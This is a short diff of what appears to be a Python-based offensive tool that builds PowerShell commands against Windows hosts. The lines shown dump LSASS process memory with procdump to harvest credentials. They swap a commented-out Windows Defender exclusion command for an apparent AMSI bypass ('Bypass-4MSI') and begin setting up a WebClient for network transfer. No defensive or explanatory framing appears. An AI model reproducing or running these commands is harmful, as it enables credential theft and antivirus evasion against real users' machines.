@@ -32,7 +32,8 @@
       path=f"""C:\\Users\\{username}\\Documents\\lsass.dmp"""
 
 
-      set=r"set-mppreference -exclusionpath C:\\"
+      #set=r"set-mppreference -exclusionpath C:\\"
+      set="Bypass-4MSI"
       dump="./procdump.exe -accepteula -ma lsass.exe lsass.dmp"
       ex_1="[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
       ex_2="$webClient = New-Object System.Net.WebClient;"
